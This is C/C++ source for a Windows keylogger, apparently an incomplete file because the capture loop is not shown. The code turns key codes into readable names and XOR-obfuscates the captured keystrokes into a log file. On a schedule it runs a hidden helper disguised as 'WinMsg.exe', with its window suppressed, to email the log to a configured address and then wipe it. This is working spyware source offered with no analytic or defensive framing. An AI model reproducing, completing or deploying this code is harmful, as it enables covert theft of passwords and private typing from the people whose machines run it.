#include <sys/stat.h>
#include <windows.h>
#include <string.h>
#include <time.h>
#include <stdio.h>
#include <fstream>
#include <cstdlib>
#include <iostream>
using namespace std;
#define EMAIL_ADDRESS ""
#define USER_PASSWORD ""
#define FILE_NAME "FILE"
#define FILE_COPY "COPY"
#define FILE_TIME "TIME"
#define FILE_ID "ID"
#define SENDER "WinMsg.exe"
#define MAX_SERVER_SIZE 25E5
#define MAX_FILE_SIZE 5E4
#define KEY 1102
#define MAX_CHAR 512
#define SEND_DAYS 3

bool GlobalCapsLock;
tm GlobalTime;

struct VirtualKey
{
	DWORD Code;
	string Name;
};

const VirtualKey keys[] =
{
	{ 0x30, "0"},
	{ 0x31, "1"},
	{ 0x32, "2"},
	{ 0x33, "3"},
	{ 0x34, "4"},
	{ 0x35, "5"},
	{ 0x36, "6"},
	{ 0x37, "7"},
	{ 0x38, "8"},
	{ 0x39, "9"},
	{ 0x41, "A"},
	{ 0x42, "B"},
	{ 0x43, "C"},
	{ 0x44, "D"},
	{ 0x45, "E"},
	{ 0x46, "F"},
	{ 0x47, "G"},
	{ 0x48, "H"},
	{ 0x49, "I"},
	{ 0x4A, "J"},
	{ 0x4B, "K"},
	{ 0x4C, "L"},
	{ 0x4D, "M"},
	{ 0x4E, "N"},
	{ 0x4F, "O"},
	{ 0x50, "P"},
	{ 0x51, "Q"},
	{ 0x52, "R"},
	{ 0x53, "S"},
	{ 0x54, "T"},
	{ 0x55, "U"},
	{ 0x56, "V"},
	{ 0x57, "W"},
	{ 0x58, "X"},
	{ 0x59, "Y"},
	{ 0x5A, "Z"},
	{ 0x60, "0"},
	{ 0x61, "1"},
	{ 0x62, "2"},
	{ 0x63, "3"},
	{ 0x64, "4"},
	{ 0x65, "5"},
	{ 0x66, "6"},
	{ 0x67, "7"},
	{ 0x68, "8"},
	{ 0x69, "9"},
	{ 0x70, "{F1}"},
	{ 0x71, "{F2}"},
	{ 0x72, "{F3}"},
	{ 0x73, "{F4}"},
	{ 0x74, "{F5}"},
	{ 0x75, "{F6}"},
	{ 0x76, "{F7}"},
	{ 0x77, "{F8}"},
	{ 0x78, "{F9}"},
	{ 0x79, "{F10}"},
	{ 0x7A, "{F11}"},
	{ 0x7B, "{F12}"},
	{ 0x6A, "*"},
	{ 0x6B, "+"},
	{ 0x6D, "-"},
	{ 0x6E, "."},
	{ 0x6F, "/"},
	{ 0xBA, "{;:}"},
	{ 0xBB, "{=+}"},
	{ 0xBC, "{,<}"},
	{ 0xBD, "{-_}"},
	{ 0xBE, "{.>}"},
	{ 0xBF, "{/?}"},
	{ 0xC0, "{`~}"},
	{ 0xDB, "{[{}"},
	{ 0xDC, "{\\|}"},
	{ 0xDD, "{]}}"},
	{ 0xDE, "{\'\"}"},
	{ 0x90, "{Num}"},
	{ 0x91, "{ScrLk}"},
	{ 0xA0, "{LShift}"},
	{ 0xA1, "{RShift}"},
	{ 0xA2, "{LCtrl}"},
	{ 0xA3, "{RCtrl}"},
	{ 0xA4, "{LMenu}"},
	{ 0xA5, "{RMenu}"},
	{ 0x2E, "{Del}"},
	{ 0x2D, "{Ins}"},
	{ 0x2C, "{PrtSc}"},
	{ 0x24, "{Home}"},
	{ 0x23, "{End}"},
	{ 0x21, "{PgUp}"},
	{ 0x22, "{PgDn}"},
	{ 0x1B, "{Esc}"},
	{ 0x14, "{Caps}"},
	{ 0x0D, "{Enter}"},
	{ 0x12, "{Alt}"},
	{ 0x11, "{Ctrl}"},
	{ 0x10, "{Shift}"},
	{ 0x09, "{Tab}"},
	{ 0x08, "{Bksp}"},
	{ 0x20, "{Sp}"},
	{ 0x25, "{L}"},
	{ 0x27, "{R}"},
	{ 0x26, "{U}"},
	{ 0x28, "{D}"},
	{ 0x5B, "{LWin}"},
	{ 0x5C, "{RWin}"}
};

const int keysNum = sizeof(keys)/sizeof(VirtualKey);

string KeyName(DWORD Key)
{
	for(int i = 0; i < keysNum; i++) if(keys[i].Code == Key) return keys[i].Name;
	char name[10];
	sprintf(name, "{0x%.2X}", Key);
	return name;
}

double FileSize(char File[])
{
	struct stat Size;
	if(stat(File, &Size) == -1) return -1;
	return Size.st_size;
}

void ClearLogFile(char File[])
{
	FILE *fp = fopen(File, "wb+");
	fwrite(NULL, 0, 1, fp);
	fclose(fp);
}

int OpenFile(char File[])
{
	int ExitCode;
	STARTUPINFO StartInfo;
	PROCESS_INFORMATION ProcessInfo;
	memset(&StartInfo, 0, sizeof(StartInfo));
	memset(&ProcessInfo, 0, sizeof(ProcessInfo));
	StartInfo.cb = sizeof(STARTUPINFO);
	StartInfo.dwFlags = STARTF_USESHOWWINDOW;
	StartInfo.wShowWindow = SW_HIDE;
	CreateProcess(0, File, 0, 0, 0, 0, 0, 0, &StartInfo, &ProcessInfo);
	WaitForSingleObject(ProcessInfo.hProcess, INFINITE);
	GetExitCodeProcess(ProcessInfo.hProcess, (DWORD*)&ExitCode);
	CloseHandle(ProcessInfo.hProcess);
	CloseHandle(ProcessInfo.hThread);
	return ExitCode;
}

bool CapsLock(void)
{
	return (GetKeyState(VK_CAPITAL) & 0xffff) != 0;
}

tm GetTime(void)
{
	time_t x = time(NULL);
	tm *p = localtime(&x), t = *p;
	return t;
}

bool timedif(tm time1, tm time2)
{
	return (time1.tm_min != time2.tm_min) || (time1.tm_hour != time2.tm_hour) || (time1.tm_yday != time2.tm_yday) || (time1.tm_year != time2.tm_year);
}

string GetTimeStr(tm time)
{
	char buf[35];
	strftime(buf, 35, "\n%%Time = %H:%M %d.%m.%y%%\n", &time);
	return buf;
}

void Save(string str)
{
	FILE *fp = fopen(FILE_NAME, "ab+");
	for(int i = 0; i < str.size(); i++)
	{
		str[i] ^= KEY;
		fwrite(&str[i], sizeof(char), 1, fp);
	}
	fclose(fp);
}

string GetCapsLockStr(bool CapsLock)
{
	return (string)"\n%CapsLock = " + ((CapsLock) ? "TRUE%\n" : "FALSE%\n");
}

bool SendTime(time_t &LastTimeSend)
{
	time_t Now = time(NULL);
	return difftime(Now, LastTimeSend) > (double)SEND_DAYS*24*60*60;
}

void NewLastTimeSend(void)
{
	time_t LastTimeSend = time(NULL);
	FILE *fp = fopen(FILE_TIME, "wb+");
	fwrite(&LastTimeSend, sizeof(time_t), 1, fp);
	fclose(fp);
}

bool SendLogFile(void)
{
	Save("\n%Message = Try Send Email%\n");
	Save(GetTimeStr(GetTime()));
	char command[MAX_CHAR * 4];
	sprintf(command, "\"%s\" \"%s\" \"%s\" \"%s\"", SENDER, EMAIL_ADDRESS, USER_PASSWORD, FILE_NAME);
	bool ExitCode = (OpenFile(command) == 0);
	if(ExitCode)
	{
		ClearLogFile(FILE_NAME);
		NewLastTimeSend();
	}
	return ExitCode;
}

bool SendBigFile(void)
{
	char ch;
	bool ExitCode;
	CopyFile(FILE_NAME, FILE_COPY, FALSE);
	FILE *fp = fopen(FILE_COPY, "rb");
	while(!feof(fp))
	{
		FILE *fp_copy = fopen(FILE_NAME, "wb+");
		for(int i = 0; !feof(fp) && (sizeof(char)*i) < MAX_SERVER_SIZE; i++)
			if((ch = fgetc(fp)) != EOF) fwrite(&ch, sizeof(char), 1, fp_copy);
		fclose(fp_copy);
		ExitCode = SendLogFile();
		if(!ExitCode)
		{
			CopyFile(FILE_COPY, FILE_NAME, FALSE);
			break;
		}
	}
	fclose(fp);
	remove(FILE_COPY);
	return ExitCode;
}

string GetID(void)
{
	string id;
	ifstream file(FILE_ID);
	if(file.is_open())
	{
		getline(file, id);
		return id;
	}
	else return "%Error = Not Found ID File%";
}

void SetNewLastTimeSend(time_t &LastTimeSend)
{
	Save("\n%Error = Not Found TIME File%\n");
	LastTimeSend = time(NULL);
	FILE *fp = fopen(FILE_TIME, "wb+");
	fwrite(&LastTimeSend, sizeof(time_t), 1, fp);
	fclose(fp);
}

void SetLastTimeSend(time_t &LastTimeSend)
{
	FILE *fp = fopen(FILE_TIME, "rb");
	if(fp != NULL)
	{
		fread(&LastTimeSend, sizeof(time_t), 1, fp);
		fclose(fp);
	}
	else SetNewLastTimeSend(LastTimeSend);
}

void Send(void)
{
	time_t LastTimeSend;
	SetLastTimeSend(LastTimeSend);
	double size = FileSize(FILE_NAME);
	if(size > MAX_SERVER_SIZE) SendBigFile();
	else if((size > MAX_FILE_SIZE) || SendTime(LastTimeSend)) SendLogFile();
}

